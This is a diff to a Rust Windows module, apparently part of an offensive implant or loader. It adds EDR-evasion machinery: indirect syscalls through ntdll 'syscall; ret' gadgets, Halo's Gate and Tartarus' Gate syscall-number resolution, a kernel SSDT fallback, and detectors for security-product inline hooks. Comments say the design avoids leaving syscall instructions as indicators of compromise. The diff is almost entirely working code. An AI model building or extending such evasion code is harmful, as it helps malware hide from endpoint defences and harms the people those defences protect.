@@ -37,6 +37,15 @@
 
 #![cfg(windows)]
 
+#[cfg(not(feature = "win32-impl"))]
+compile_error!("nt_syscall requires the `win32-impl` feature on Windows targets");
+
+#[cfg(all(feature = "x86_64-only", not(target_arch = "x86_64")))]
+compile_error!("nt_syscall feature `x86_64-only` requires a Windows x86_64 target");
+
+#[cfg(all(target_arch = "aarch64", not(feature = "aarch64-support")))]
+compile_error!("nt_syscall Windows ARM64 builds require the `aarch64-support` feature");
+
 use anyhow::anyhow;
 use std::collections::HashMap;
 use std::sync::atomic::{AtomicBool, AtomicU32, Ordering};
@@ -44,6 +53,7 @@ use std::sync::atomic::{AtomicBool, AtomicU32, Ordering};
 // ─── NT native types (not exposed by windows-sys) ──────────────────────────
 
 #[repr(C)]
+#[allow(non_snake_case)]
 struct UNICODE_STRING {
     Length: u16,
     MaximumLength: u16,
@@ -51,6 +61,7 @@ struct UNICODE_STRING {
 }
 
 #[repr(C)]
+#[allow(non_snake_case)]
 struct OBJECT_ATTRIBUTES {
     Length: u32,
     RootDirectory: *mut std::ffi::c_void,
@@ -144,11 +155,51 @@ pub fn invalidate_syscall_cache() {
     }
     CACHED_TIMESTAMP.store(0, Ordering::Release);
     // Reset the clean ntdll mapping so get_syscall_id / init_syscall_infrastructure
-    // will re-map from disk on next access.
+    // will re-map from disk on next access.  Unmap the old view first to avoid
+    // leaking the memory-mapped section (MED-030).
     if let Ok(mut guard) = CLEAN_NTDLL.write() {
-        *guard = None;
+        if let Some(old_base) = guard.take() {
+            // Attempt to unmap the old section view.  This is best-effort —
+            // if NtUnmapViewOfSection is unavailable we log and continue.
+            unmap_ntdll_view(old_base);
+        }
     }
     log::debug!("nt_syscall: cache invalidated — full re-map on next access");
+}
+
+/// Unmap a previously mapped ntdll section view.  Best-effort: logs on failure
+/// but does not propagate errors since this is called during cache invalidation.
+fn unmap_ntdll_view(base: usize) {
+    if base == 0 {
+        return;
+    }
+    // Resolve NtUnmapViewOfSection via bootstrap (it may not be cached yet).
+    if let Some(unmap_target) = get_bootstrap_ssn("NtUnmapViewOfSection") {
+        let status = unsafe {
+            do_syscall(
+                unmap_target.ssn,
+                unmap_target.gadget_addr,
+                &[
+                    (-1isize) as u64, // NtCurrentProcess()
+                    base as u64,      // BaseAddress
+                ],
+            )
+        };
+        if status < 0 {
+            log::warn!(
+                "nt_syscall: NtUnmapViewOfSection({:#x}) failed (NTSTATUS {:#010x})",
+                base,
+                status as u32
+            );
+        } else {
+            log::debug!("nt_syscall: unmapped stale ntdll view at {:#x}", base);
+        }
+    } else {
+        log::warn!(
+            "nt_syscall: cannot resolve NtUnmapViewOfSection — stale ntdll view at {:#x} may leak",
+            base
+        );
+    }
 }
 
 /// Backwards-compatible alias for [`invalidate_syscall_cache`].
@@ -586,17 +637,24 @@ unsafe fn resolve_via_ssdt(func_name: &str) -> Option<SyscallTarget> {
             let gadget = get_bootstrap_ssn("NtClose")
                 .map(|t| t.gadget_addr)
                 .unwrap_or(0);
-            if gadget != 0 {
+            if gadget == 0 {
+                log::warn!(
+                    "nt_syscall: SSDT resolved {} → SSN={} but NtClose gadget unavailable; \
+                     caller will use direct-syscall fallback (leaves syscall insn as IoC)",
+                    func_name,
+                    i
+                );
+            } else {
                 log::info!(
                     "nt_syscall: SSDT resolved {} → SSN={} (verified via kernel SSDT)",
                     func_name,
                     i
                 );
-                return Some(SyscallTarget {
-                    ssn: i as u32,
-                    gadget_addr: gadget,
-                });
             }
+            return Some(SyscallTarget {
+                ssn: i as u32,
+                gadget_addr: gadget,
+            });
         }
     }
 
@@ -1018,20 +1076,106 @@ unsafe fn query_kernel_base() -> Option<usize> {
 /// Attempt to extract the SSN and gadget address directly from an unhooked
 /// `Nt*` stub at `func_addr` (x86-64).  Returns `None` when the stub appears
 /// hooked (no `syscall` instruction found within the first 64 bytes).
+///
+/// # SSN extraction validation (MED-032)
+///
+/// A canonical Windows syscall stub has this exact layout:
+///   ```text
+///   4C 8B D1        mov r10, rcx
+///   B8 xx xx xx xx  mov eax, SSN
+///   ...
+///   0F 05           syscall
+///   C3              ret
+///   ```
+///
+/// The previous implementation scanned backward from `syscall` and took the
+/// **first** `0xB8` byte found, which could match an unrelated `mov eax, ...`
+/// instruction in complex or obfuscated stubs.  The new implementation:
+///
+/// 1. Validates the `mov eax, imm32` is preceded by `mov r10, rcx` (4C 8B D1)
+///    at the canonical position (offset 0).
+/// 2. Falls back to a less strict scan but validates the SSN is within the
+///    Windows syscall number range (0–0x0800).
+/// 3. Rejects matches where the `0xB8` byte could be part of a larger
+///    instruction (e.g., an operand of `add [rax+0xB8], ...`).
 #[cfg(all(windows, target_arch = "x86_64"))]
 unsafe fn parse_syscall_stub(func_addr: usize) -> Option<SyscallTarget> {
     let bytes = std::slice::from_raw_parts(func_addr as *const u8, 64);
+
+    // Find the `syscall` instruction (0F 05) within the first 64 bytes.
     for j in 0..bytes.len().saturating_sub(1) {
         if bytes[j] == 0x0f && bytes[j + 1] == 0x05 {
+            let gadget_addr = func_addr + j;
+
+            // ── Strategy 1: Canonical pattern match ────────────────
+            // Look for: 4C 8B D1  B8 xx xx xx xx  at offset 0.
+            // This is the definitive pattern for an unhooked Windows stub.
+            if bytes.len() >= 8
+                && bytes[0] == 0x4C
+                && bytes[1] == 0x8B
+                && bytes[2] == 0xD1
+                && bytes[3] == 0xB8
+            {
+                let ssn = u32::from_le_bytes(bytes[4..8].try_into().unwrap());
+                return Some(SyscallTarget { ssn, gadget_addr });
+            }
+
+            // ── Strategy 2: Validated backward scan ────────────────
+            // Scan backward from the syscall instruction looking for
+            // `mov eax, imm32` (B8 xx xx xx xx).  Validate each candidate:
+            //   a) The B8 byte should not be part of a ModRM operand
+            //      (i.e., the byte before it should not be a prefix byte
+            //      like 83, 81, 01, 03, etc. that encodes an ALU op with
+            //      imm32 where B8 would be a ModRM or SIB byte).
+            //   b) The extracted SSN should be < 0x0800 (Windows has
+            //      roughly 400–500 syscalls; generous upper bound).
+            //   c) The B8 should be within 32 bytes of the stub start
+            //      (a real stub is typically ≤ 32 bytes total).
+            const MAX_SSN: u32 = 0x0800;
+            const MAX_STUB_LEN: usize = 32;
+
             for k in (0..j).rev() {
                 if bytes[k] == 0xb8 && k + 5 <= bytes.len() {
+                    // Check: is this position within a reasonable stub length?
+                    if k > MAX_STUB_LEN {
+                        continue;
+                    }
+
+                    // Check: could this 0xB8 be part of a larger instruction?
+                    // If the byte before it is an ALU opcode that takes imm32
+                    // (e.g., 01 = add r/m, r; 03 = add r, r/m; 81 = group imm32;
+                    // 83 = group imm8; 89 = mov r/m, r; 8B = mov r, r/m), then
+                    // this 0xB8 is likely a ModRM byte, not an opcode.
+                    if k > 0 {
+                        let prev = bytes[k - 1];
+                        // Common ALU / mov opcodes that use ModRM + possible imm32:
+                        if matches!(prev, 0x01..=0x03 | 0x08..=0x0B | 0x10..=0x13
+                            | 0x18..=0x1B | 0x20..=0x23 | 0x28..=0x2B
+                            | 0x30..=0x33 | 0x38..=0x3B | 0x63 | 0x69 | 0x6B
+                            | 0x81 | 0x83 | 0x85 | 0x87 | 0x89 | 0x8B | 0x8D
+                            | 0x8F | 0xC1 | 0xC3 | 0xC6 | 0xC7
+                            | 0xD1 | 0xD3 | 0xF7 | 0xFF)
+                        {
+                            continue; // Likely a ModRM operand, not an opcode
+                        }
+                        // REX prefix (0x40–0x4F) before B8 means `mov r64, imm64`,
+                        // not `mov eax, imm32` — skip.
+                        if (0x40..=0x4F).contains(&prev) {
+                            continue;
+                        }
+                    }
+
                     let ssn = u32::from_le_bytes(bytes[k + 1..k + 5].try_into().unwrap());
-                    return Some(SyscallTarget {
-                        ssn,
-                        gadget_addr: func_addr + j,
-                    });
+                    // Validate SSN is in a reasonable range for Windows.
+                    if ssn > MAX_SSN {
+                        continue;
+                    }
+                    return Some(SyscallTarget { ssn, gadget_addr });
                 }
             }
+
+            // No valid `mov eax` found — stub may be hooked or non-standard.
+            return None;
         }
     }
     None
@@ -1170,6 +1314,77 @@ unsafe fn collect_nt_export_vas(module_base: usize) -> Vec<usize> {
     result
 }
 
+/// Tartarus' Gate: resolve an SSN by sorting all `Nt*` exports by virtual
+/// address and using the target function's position in the sorted list as
+/// its SSN.
+///
+/// Windows assigns SSNs to `Nt*` functions in monotonically increasing order
+/// of their addresses in the ntdll export table.  By sorting all non-forwarded
+/// `Nt*` exports and finding the target's index, we can determine its SSN
+/// **without reading the stub's code bytes at all** — making this completely
+/// immune to inline hooks.
+///
+/// This is less reliable than the SSDT fallback (it assumes a clean export
+/// table and that no `Nt*` exports have been removed) but requires no
+/// kernel memory access.  It serves as an intermediate fallback when:
+///   - Halo's Gate fails (all neighbours are hooked)
+///   - The SSDT fallback is unavailable (no SeDebugPrivilege / no BYOVD)
+///
+/// Returns `None` if the target function is not found among the exports.
+#[cfg(windows)]
+unsafe fn resolve_via_tartarus_gate(ntdll_base: usize, func_name: &str) -> Option<SyscallTarget> {
+    let mut vas = collect_nt_export_vas(ntdll_base);
+    if vas.is_empty() {
+        log::warn!("nt_syscall: Tartarus' Gate — no Nt* exports found");
+        return None;
+    }
+    vas.sort_unstable();
+
+    // Find the target function's address.
+    let mut name = func_name.as_bytes().to_vec();
+    name.push(0);
+    let target_hash = pe_resolve::hash_str(&name);
+    let target_addr = pe_resolve::get_proc_address_by_hash(ntdll_base, target_hash)?;
+
+    // Find its position in the sorted list — that IS its SSN.
+    let idx = vas.iter().position(|&va| va == target_addr)?;
+
+    // Find a usable gadget.  Try the clean ntdll mapping first, then scan
+    // the loaded ntdll's .text section for a syscall;ret gadget.
+    let gadget =
+        if let Some(clean_base) = CLEAN_NTDLL.read().ok().and_then(|g| *g).filter(|&b| b != 0) {
+            scan_text_for_syscall_gadget(clean_base)
+        } else {
+            scan_text_for_syscall_gadget(ntdll_base)
+        };
+
+    if let Some(gadget_addr) = gadget {
+        log::info!(
+            "nt_syscall: Tartarus' Gate resolved {} → SSN={} (sorted position of {:#x})",
+            func_name,
+            idx,
+            target_addr
+        );
+        Some(SyscallTarget {
+            ssn: idx as u32,
+            gadget_addr,
+        })
+    } else {
+        // No gadget found — still return the SSN with gadget_addr=0 so the
+        // caller can fall back to a direct syscall.
+        log::warn!(
+            "nt_syscall: Tartarus' Gate resolved {} → SSN={} but no gadget found; \
+             direct syscall will be used",
+            func_name,
+            idx
+        );
+        Some(SyscallTarget {
+            ssn: idx as u32,
+            gadget_addr: 0,
+        })
+    }
+}
+
 /// Halo's Gate: infer `target_addr`'s SSN from parseable neighbours.
 #[cfg(windows)]
 unsafe fn infer_ssn_halo_gate(ntdll_base: usize, target_addr: usize) -> Option<SyscallTarget> {
@@ -1201,7 +1416,7 @@ unsafe fn infer_ssn_halo_gate(ntdll_base: usize, target_addr: usize) -> Option<S
         }
         if delta <= target_idx {
             if let Some(t) = parse_syscall_stub(vas[target_idx - delta]) {
-                let inferred = t.ssn + delta as u32;
+                let inferred = t.ssn.checked_add(delta as u32).unwrap_or(t.ssn);
                 log::debug!(
                     "nt_syscall::halo_gate: SSN {} inferred for {:#x} (lower-{})",
                     inferred,
@@ -1324,6 +1539,101 @@ unsafe fn scan_text_for_syscall_gadget(ntdll_base: usize) -> Option<usize> {
     None
 }
 
+/// Detect x86-64 inline hooks on an ntdll syscall stub prologue.
+///
+/// A legitimate (unhooked) Windows syscall stub starts with one of:
+///   - `mov r10, rcx` (4C 8B D1) followed by `mov eax, SSN` (B8 xx xx xx xx)
+///   - `mov eax, SSN`  (B8 xx xx xx xx) directly (some minimal stubs)
+///
+/// Common EDR hook patterns this detects:
+///   - `jmp [rip+off]`  (FF 25 xx xx xx xx) — detour via absolute indirect jump
+///   - `jmp rel32`      (E9 xx xx xx xx)     — relative jump detour
+///   - `push imm32; ret` (68 xx xx xx xx C3) — push-return detour
+///   - `mov rax, imm64; jmp rax` (48 B8 ... FF E0) — absolute detour
+///   - `int3`           (CC)                  — software/hardware breakpoint
+///   - `nop`            (90)                  — NOP sled (patched out)
+///   - `ret`            (C3) at byte 0        — early return (trampoline tail)
+#[cfg(all(windows, target_arch = "x86_64"))]
+fn detect_hook_x64(prologue: &[u8]) -> bool {
+    if prologue.len() < 2 {
+        return true; // Can't read — assume hooked
+    }
+    let b0 = prologue[0];
+    let b1 = prologue[1];
+
+    // ── Known-clean patterns: standard syscall stub prologues ─────────
+    // Pattern 1: mov r10, rcx (4C 8B D1) — canonical Windows stub start
+    if b0 == 0x4C && b1 == 0x8B {
+        return false;
+    }
+    // Pattern 2: mov eax, imm32 (B8 xx xx xx xx) — some minimal stubs
+    if b0 == 0xB8 {
+        return false;
+    }
+    // Pattern 3: xor eax, eax (31 C0) — used by some placeholder stubs
+    // that return STATUS_NOT_IMPLEMENTED; not a hook.
+    if b0 == 0x31 && b1 == 0xC0 {
+        return false;
+    }
+
+    // ── Known hook patterns ───────────────────────────────────────────
+    // jmp [rip+disp32] — absolute indirect jump (most common detour)
+    if b0 == 0xFF && b1 == 0x25 {
+        return true;
+    }
+    // jmp rel32 — relative jump detour
+    if b0 == 0xE9 {
+        return true;
+    }
+    // jmp short (2-byte EB xx) — short jump detour
+    if b0 == 0xEB {
+        return true;
+    }
+    // push imm32 (68) followed by ret (C3) — push-ret detour
+    if b0 == 0x68 && prologue.len() >= 6 && prologue[5] == 0xC3 {
+        return true;
+    }
+    // mov rax, imm64 (48 B8) — absolute address loading for jmp rax
+    if b0 == 0x48 && b1 == 0xB8 {
+        return true;
+    }
+    // call rel32 (E8) — call-based detour (unusual but possible)
+    if b0 == 0xE8 {
+        return true;
+    }
+    // int3 (CC) — software breakpoint hook
+    if b0 == 0xCC {
+        return true;
+    }
+    // nop (90) — NOP'd out (trampoline patched)
+    if b0 == 0x90 {
+        return true;
+    }
+    // ret (C3) — immediate return (some trampolines)
+    if b0 == 0xC3 {
+        return true;
+    }
+    // push rbx / push rax (53/50) — some hooks push a register before jumping
+    if (b0 == 0x53 || b0 == 0x50) && prologue.len() > 2 {
+        let b2 = prologue[2];
+        // push; jmp rel32 or push; jmp [rip+off]
+        if b2 == 0xE9 || (b2 == 0xFF && prologue.len() > 3 && prologue[3] == 0x25) {
+            return true;
+        }
+    }
+
+    // Any other byte is suspicious — the stub must start with one of the
+    // known-clean patterns above.  This conservative default catches
+    // novel hook techniques (e.g., VEH-dispatched hooks that overwrite
+    // the first bytes with an intentional exception trigger).
+    log::debug!(
+        "nt_syscall::hook_detect: unknown prologue byte {:#04x} {:#04x} — treating as hooked",
+        b0,
+        b1
+    );
+    true
+}
+
 /// Bootstrap SSN resolution (x86-64): inspect prologue bytes for hook
 /// detection, then use Halo's Gate for SSN and a `.text` scan for the gadget.
 #[cfg(all(windows, target_arch = "x86_64"))]
@@ -1335,8 +1645,10 @@ fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
         let target_hash = pe_resolve::hash_str(&name);
         let func_addr = pe_resolve::get_proc_address_by_hash(ntdll_base, target_hash)?;
 
-        let prologue = std::slice::from_raw_parts(func_addr as *const u8, 2);
-        let is_hooked = !((prologue[0] == 0x4C && prologue[1] == 0x8B) || prologue[0] == 0xB8);
+        // Read up to 8 bytes for hook detection — the standard prologue is
+        // at least 3 bytes (mov r10, rcx) but hooks often start at byte 0.
+        let prologue = std::slice::from_raw_parts(func_addr as *const u8, 8);
+        let is_hooked = detect_hook_x64(prologue);
 
         if !is_hooked {
             if let Some(t) = parse_syscall_stub(func_addr) {
@@ -1345,9 +1657,8 @@ fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
         } else {
             log::warn!(
                 "nt_syscall: {func_name} stub appears hooked \
-                 (prologue: {:#04x} {:#04x}); using Halo's Gate + .text gadget scan",
-                prologue[0],
-                prologue[1]
+                 (prologue: {:02x?}); using Halo's Gate + .text gadget scan",
+                &prologue[..8.min(prologue.len())]
             );
         }
 
@@ -1405,6 +1716,84 @@ fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
     }
 }
 
+/// Detect ARM64 inline hooks on an ntdll syscall stub.
+///
+/// A legitimate (unhooked) ARM64 `Nt*` stub starts with:
+///   - `movz x8, #imm16` (opcode bits: 0xD2800008 | (imm << 5))
+///
+/// Common ARM64 hook patterns this detects:
+///   - `b offset`   (unconditional branch — most common detour)
+///   - `br xN`      (branch to register — trampoline)
+///   - `blr xN`     (branch with link to register)
+///   - `ret`        (0xD65F03C0 — immediate return)
+///   - `brk #imm`   (0xD4200000 | ... — breakpoint hook)
+///   - `nop`        (0xD503201F — NOP'd out)
+///   - `movk x8, ...` without preceding `movz x8` (partial overwrite)
+///
+/// Returns `true` if the stub appears hooked, `false` if it looks clean.
+#[cfg(all(windows, target_arch = "aarch64"))]
+fn detect_hook_arm64(first_word: u32, second_word: u32) -> bool {
+    // ── Known-clean patterns ──────────────────────────────────────────
+    // movz x8, #imm16 — canonical ARM64 syscall stub start
+    if (first_word & 0xFFE0001F) == 0xD2800008 {
+        return false;
+    }
+    // movk x8, #imm16, lsl #16 — upper half of SSN load; legitimate
+    // (some stubs with SSNs > 0xFFFF use movz + movk)
+    if (first_word & 0xFFE0001F) == 0xF2A00008 {
+        return false;
+    }
+
+    // ── Known hook patterns ───────────────────────────────────────────
+    // Unconditional branch: b offset — top 6 bits = 000101
+    if (first_word >> 26) == 0b000101 {
+        return true;
+    }
+    // Branch to register: br xN — opcode 1101011_0000_11111_0000_00_Rn_00000
+    if (first_word & 0xFFFFFC1F) == 0xD61F0000 {
+        return true;
+    }
+    // Branch with link to register: blr xN — opcode 1101011_0000_11111_0000_01_Rn_00000
+    if (first_word & 0xFFFFFC1F) == 0xD63F0000 {
+        return true;
+    }
+    // ret — 0xD65F03C0
+    if first_word == 0xD65F03C0 {
+        return true;
+    }
+    // brk #imm — breakpoint: 0xD4200000 | (imm16 << 5)
+    if (first_word & 0xFFE0001F) == 0xD4200000 {
+        return true;
+    }
+    // hvc #imm — hypervisor call (used by some hypervisor-based hooks)
+    if (first_word & 0xFFE0001F) == 0xD4000002 {
+        return true;
+    }
+    // smc #imm — secure monitor call
+    if (first_word & 0xFFE0001F) == 0xD4000003 {
+        return true;
+    }
+    // nop — 0xD503201F (patched out stub)
+    if first_word == 0xD503201F {
+        return true;
+    }
+    // cbz/cbnz — compare and branch (sometimes used as conditional hooks)
+    if (first_word >> 24) & 0x7F == 0b0110100 || (first_word >> 24) & 0x7F == 0b0110101 {
+        return true;
+    }
+    // tbz/tbnz — test bit and branch (another conditional hook pattern)
+    if (first_word >> 24) & 0x7F == 0b0110110 || (first_word >> 24) & 0x7F == 0b0110111 {
+        return true;
+    }
+
+    // Any other instruction is suspicious — conservative default.
+    log::debug!(
+        "nt_syscall::hook_detect: unknown ARM64 instruction {:#010x} (next: {:#010x}) — treating as hooked",
+        first_word, second_word
+    );
+    true
+}
+
 /// Bootstrap SSN resolution (ARM64): inspect the first instruction for hook
 /// detection.  An unhooked ARM64 Nt* stub starts with `movz x8, #imm16`
 /// (opcode mask 0xFFE0001F == 0xD2800008).  A hooked stub typically begins
@@ -1419,7 +1808,12 @@ fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
         let func_addr = pe_resolve::get_proc_address_by_hash(ntdll_base, target_hash)?;
 
         let first_word = std::ptr::read_unaligned(func_addr as *const u32);
-        let is_hooked = (first_word & 0xFFE0001F) != 0xD2800008;
+        let second_word = if func_addr as usize + 4 < usize::MAX {
+            std::ptr::read_unaligned((func_addr as *const u32).add(1))
+        } else {
+            0
+        };
+        let is_hooked = detect_hook_arm64(first_word, second_word);
 
         if !is_hooked {
             if let Some(t) = parse_syscall_stub(func_addr) {
@@ -1428,8 +1822,9 @@ fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
         } else {
             log::warn!(
                 "nt_syscall: {func_name} stub appears hooked \
-                 (first instruction: {:#010x}); using Halo's Gate + .text gadget scan",
-                first_word
+                 (instructions: {:#010x}, {:#010x}); using Halo's Gate + .text gadget scan",
+                first_word,
+                second_word
             );
         }
 
@@ -1663,13 +2058,62 @@ pub fn get_syscall_id(func_name: &str) -> anyhow::Result<SyscallTarget> {
         return Ok(SyscallTarget { ssn, gadget_addr });
     }
 
-    // Resolution order: clean ntdll → bootstrap → SSDT fallback.
+    // Resolution order: clean ntdll → bootstrap → Tartarus' Gate → SSDT fallback.
+    let ntdll_base = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) }
+        .map(|h| h as usize)
+        .unwrap_or(0);
     let clean_base = CLEAN_NTDLL.read().ok().and_then(|g| *g).filter(|&b| b != 0);
     let target = match clean_base {
         Some(base) => unsafe { read_export_ssn(base, func_name) }?,
-        None => get_bootstrap_ssn(func_name).ok_or_else(|| {
-            anyhow!("nt_syscall: bootstrap SSN resolution failed for '{func_name}'")
-        })?,
+        None => match get_bootstrap_ssn(func_name) {
+            Some(t) => t,
+            None => {
+                // Bootstrap failed (all stubs hooked / unparseable).
+                // Try Tartarus' Gate: sort Nt* exports by VA → SSN = index.
+                log::info!(
+                    "nt_syscall: bootstrap failed for '{}'; attempting Tartarus' Gate",
+                    func_name
+                );
+                if ntdll_base != 0 {
+                    match unsafe { resolve_via_tartarus_gate(ntdll_base, func_name) } {
+                        Some(tg_target) => tg_target,
+                        None => {
+                            // Tartarus' Gate also failed — try SSDT nuclear fallback
+                            // before giving up.  SSDT reads kernel memory and is the
+                            // highest-reliability method but most detectable.
+                            log::info!(
+                                "nt_syscall: Tartarus' Gate failed for '{}'; attempting SSDT fallback",
+                                func_name
+                            );
+                            match unsafe { resolve_via_ssdt(func_name) } {
+                                Some(ssdt_target) => {
+                                    cache.lock().unwrap().insert(
+                                        func_name.to_string(),
+                                        (
+                                            ssdt_target.ssn,
+                                            ssdt_target.gadget_addr,
+                                            CACHED_TIMESTAMP.load(Ordering::Acquire),
+                                        ),
+                                    );
+                                    return Ok(ssdt_target);
+                                }
+                                None => {
+                                    return Err(anyhow!(
+                                        "nt_syscall: all resolution methods failed for '{func_name}' \
+                                         (bootstrap + Tartarus' Gate + SSDT)"
+                                    ));
+                                }
+                            }
+                        }
+                    }
+                } else {
+                    return Err(anyhow!(
+                        "nt_syscall: all resolution methods failed for '{func_name}' \
+                         (bootstrap failed, ntdll base unavailable)"
+                    ));
+                }
+            }
+        },
     };
 
     // Validate against versioned SSN range table.
@@ -1679,10 +2123,38 @@ pub fn get_syscall_id(func_name: &str) -> anyhow::Result<SyscallTarget> {
             if target.ssn < lo || target.ssn > hi {
                 log::warn!(
                     "nt_syscall: resolved {} SSN={} is outside expected range [{},{}] for build {}; \
-                     attempting SSDT fallback",
+                     attempting Tartarus' Gate then SSDT fallback",
                     func_name, target.ssn, lo, hi, build
                 );
-                // Try SSDT fallback for this specific syscall.
+                // Try Tartarus' Gate first — no kernel memory access needed.
+                if ntdll_base != 0 {
+                    if let Some(tg_target) =
+                        unsafe { resolve_via_tartarus_gate(ntdll_base, func_name) }
+                    {
+                        if tg_target.ssn >= lo && tg_target.ssn <= hi {
+                            log::info!(
+                                "nt_syscall: Tartarus' Gate produced valid SSN={} for {}",
+                                tg_target.ssn,
+                                func_name
+                            );
+                            cache.lock().unwrap().insert(
+                                func_name.to_string(),
+                                (
+                                    tg_target.ssn,
+                                    tg_target.gadget_addr,
+                                    CACHED_TIMESTAMP.load(Ordering::Acquire),
+                                ),
+                            );
+                            return Ok(tg_target);
+                        }
+                        log::warn!(
+                            "nt_syscall: Tartarus' Gate SSN={} still out of range for {}; trying SSDT",
+                            tg_target.ssn,
+                            func_name
+                        );
+                    }
+                }
+                // Tartarus' Gate failed or produced out-of-range SSN — try SSDT.
                 if let Some(ssdt_target) = unsafe { resolve_via_ssdt(func_name) } {
                     cache.lock().unwrap().insert(
                         func_name.to_string(),
@@ -1694,9 +2166,10 @@ pub fn get_syscall_id(func_name: &str) -> anyhow::Result<SyscallTarget> {
                     );
                     return Ok(ssdt_target);
                 }
-                // SSDT failed too — use what we have but log a warning.
+                // All fallbacks failed — use what we have but log a warning.
                 log::warn!(
-                    "nt_syscall: SSDT fallback failed; using resolved SSN despite range mismatch"
+                    "nt_syscall: Tartarus' Gate + SSDT fallbacks failed; \
+                     using resolved SSN despite range mismatch"
                 );
             }
         }
@@ -1734,49 +2207,100 @@ pub unsafe fn do_syscall(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
         let stack_args: &[u64] = if args.len() > 4 { &args[4..] } else { &[] };
         let nstack: usize = stack_args.len();
         let stack_ptr: *const u64 = stack_args.as_ptr();
-        let status: i32;
 
-        core::arch::asm!(
-            // Save RSP; restore after the call.
-            "mov r14, rsp",
-            // Allocate 0x20 shadow space + stack args (8 bytes each), aligned.
-            "mov rax, rcx",
-            "shl rax, 3",
-            "add rax, 0x20 + 15",
-            "and rax, -16",
-            "sub rsp, rax",
-            // Copy stack arguments into [rsp+0x20 .. rsp+0x20 + nstack*8].
-            "test rcx, rcx",
-            "jz 2f",
-            "lea rdi, [rsp + 0x20]",
-            "cld",
-            "rep movsq",
-            "2:",
-            // Load syscall arguments and number.
-            "mov rcx, {a1}",
-            "mov rdx, {a2}",
-            "mov r10, rcx",
-            "mov eax, {ssn:e}",
-            "mov r11, {gadget}",
-            // Indirect syscall: call the `syscall; ret` gadget inside ntdll.
-            "call r11",
-            // Restore stack.
-            "mov rsp, r14",
-            ssn    = in(reg) ssn,
-            gadget = in(reg) gadget_addr,
-            inout("rcx") nstack => _,
-            inout("rsi") stack_ptr => _,
-            a1 = in(reg) a1,
-            a2 = in(reg) a2,
-            inlateout("r8")  a3 => _,
-            inlateout("r9")  a4 => _,
-            lateout("rax") status,
-            out("rdx") _, out("r10") _, out("r11") _,
-            out("r14") _, out("r15") _,
-            out("rdi") _,
-        );
-
-        status
+        if gadget_addr != 0 {
+            // Indirect call: jump to a `syscall; ret` gadget inside ntdll
+            // so that no `syscall` instruction exists in this crate's code
+            // pages (avoids trivial IoC signature).
+            let status: i32;
+            core::arch::asm!(
+                // Save RSP; restore after the call.
+                "mov r14, rsp",
+                // Allocate 0x20 shadow space + stack args (8 bytes each), aligned.
+                "mov rax, rcx",
+                "shl rax, 3",
+                "add rax, 0x20 + 15",
+                "and rax, -16",
+                "sub rsp, rax",
+                // Copy stack arguments into [rsp+0x20 .. rsp+0x20 + nstack*8].
+                "test rcx, rcx",
+                "jz 2f",
+                "lea rdi, [rsp + 0x20]",
+                "cld",
+                "rep movsq",
+                "2:",
+                // Load syscall arguments and number.
+                "mov rcx, {a1}",
+                "mov rdx, {a2}",
+                "mov r10, rcx",
+                "mov eax, {ssn:e}",
+                "mov r11, {gadget}",
+                // Indirect syscall: call the `syscall; ret` gadget inside ntdll.
+                "call r11",
+                // Restore stack.
+                "mov rsp, r14",
+                ssn    = in(reg) ssn,
+                gadget = in(reg) gadget_addr,
+                inout("rcx") nstack => _,
+                inout("rsi") stack_ptr => _,
+                a1 = in(reg) a1,
+                a2 = in(reg) a2,
+                inlateout("r8")  a3 => _,
+                inlateout("r9")  a4 => _,
+                lateout("rax") status,
+                out("rdx") _, out("r10") _, out("r11") _,
+                out("r14") _, out("r15") _,
+                out("rdi") _,
+                out("cc") _,
+            );
+            status
+        } else {
+            // Direct fallback: no gadget available (e.g. bootstrap mode or
+            // resolution failed).  This leaves a `syscall` instruction in
+            // the binary — a potential IoC — but is functionally correct
+            // and prevents a null-pointer crash.
+            let status: i32;
+            core::arch::asm!(
+                // Save RSP; restore after the syscall.
+                "mov r14, rsp",
+                // Allocate 0x20 shadow space + stack args, aligned.
+                "mov rax, rcx",
+                "shl rax, 3",
+                "add rax, 0x20 + 15",
+                "and rax, -16",
+                "sub rsp, rax",
+                // Copy stack arguments into [rsp+0x20 .. ].
+                "test rcx, rcx",
+                "jz 2f",
+                "lea rdi, [rsp + 0x20]",
+                "cld",
+                "rep movsq",
+                "2:",
+                // Load syscall arguments and number.
+                "mov rcx, {a1}",
+                "mov rdx, {a2}",
+                "mov r10, rcx",
+                "mov eax, {ssn:e}",
+                // Direct syscall (no gadget — leaves syscall instruction
+                // in code pages as a potential IoC).
+                "syscall",
+                // Restore stack.
+                "mov rsp, r14",
+                ssn    = in(reg) ssn,
+                inout("rcx") nstack => _,
+                inout("rsi") stack_ptr => _,
+                a1 = in(reg) a1,
+                a2 = in(reg) a2,
+                inlateout("r8")  a3 => _,
+                inlateout("r9")  a4 => _,
+                lateout("rax") status,
+                out("rdx") _, out("r10") _, out("r11") _,
+                out("r14") _, out("r15") _,
+                out("rdi") _,
+                out("cc") _,
+            );
+            status
+        }
     }
     #[cfg(target_arch = "aarch64")]
     {
